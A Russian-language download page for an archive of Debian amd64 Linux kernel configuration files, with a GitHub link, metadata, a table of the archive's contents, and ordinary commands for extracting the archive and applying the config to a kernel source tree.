---
icon: file-zip
label: Debian Kernel Config (amd64)
---

[!badge variant="ghost" icon="globe" text="Read in English"](/en/system-utils/debian-config-amd64/)

# Конфигурация ядра Debian Linux (amd64)

Архив содержит конфигурационные файлы ядра Linux для дистрибутива Debian (архитектура `amd64`), включая базовый конфиг, профиль для облачных систем (`cloud-amd64`) и тестовый профиль (`test`).

---

### 📥 Скачивание

[!button variant="primary" icon="download" text="Скачать архив (zip/tar)"](https://github.com/Pashamin/gpl-compliance-archive/raw/refs/heads/downloads/linux-debian-latest-debian-config-amd64.zip)

---

### 📋 Спецификация и метаданные

- **Пакет:** `linux-debian-latest-debian-config-amd64`
- **Архитектура:** `amd64`
- **Лицензия:** GPL-2.0 / GPL-3.0
- **Хеш SHA-1:** `f3a5e3d1b2ae0620ab43213e82268c6248a3c12a`

---

### 📂 Содержимое архива

| Файл / Каталог | Описание |
| :--- | :--- |
| `debian/config/amd64/config` | Основная конфигурация ядра Linux для amd64 |
| `debian/config/amd64/config.cloud-amd64` | Конфигурация, оптимизированная для облачных виртуальных машин |
| `debian/config/amd64/config.test` | Тестовый профиль сборки |
| `debian/config/amd64/defines.toml` | Определение параметров и метаданных сборки (TOML) |

---

### 🛠 Как использовать

=== Распаковка архива
```bash
# Распаковка tar.gz (если архив сжат)
tar -xvf linux-debian-latest-debian-config-amd64.tar.gz

# Переход в директорию конфигурации
cd linux-debian-latest-debian-config-amd64/debian/config/amd64/

=== Применение конфигурации при сборке ядра
# Копирование основного конфига в исходники ядра
cp config /path/to/linux-source/.config

# Обновление и проверка параметров конфигурации
cd /path/to/linux-source/
make olddefconfig
===